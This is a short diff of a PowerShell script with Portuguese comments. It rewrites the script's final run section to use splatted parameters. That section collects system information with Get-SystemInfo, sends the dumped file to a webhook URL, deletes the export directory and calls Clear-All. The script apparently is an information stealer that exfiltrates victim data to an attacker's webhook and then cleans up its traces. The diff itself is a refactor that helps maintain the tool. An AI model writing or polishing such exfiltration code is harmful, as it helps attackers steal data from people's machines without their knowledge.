@@ -1020,17 +1020,22 @@ function Clear-All {
 }
 
 #### Executa ####
-$out = Invoke-DataDump `
-    -DumpCommand { Get-SystemInfo -OutputFile $OutputFileDefault -ExportDir$ExportDirDefault } `
-    -OutputFile $OutputFileDefault `
-    -ExportDir $ExportDirDefault
+$dumpParams = @{
+    DumpCommand = { Get-SystemInfo -OutputFile $OutputFileDefault -ExportDir $ExportDirDefault }
+    OutputFile  = $OutputFileDefault
+    ExportDir   = $ExportDirDefault
+}
+$out = Invoke-DataDump @dumpParams
 
-Send-DumpToWebhook `
-    -FilePath $out `
-    -WebhookUrl $WebhookUrl `
-    -Title "System Info" `
-    -ExportDir $ExportDirDefault `
-    -RemoveExportDir
+#### Envia
+$webhookParams = @{
+    FilePath        = $out
+    WebhookUrl      = $WebhookUrl
+    Title           = "System Info"
+    ExportDir       = $ExportDirDefault
+    RemoveExportDir = $true
+}
+Send-DumpToWebhook @webhookParams
 
 Clear-All
 
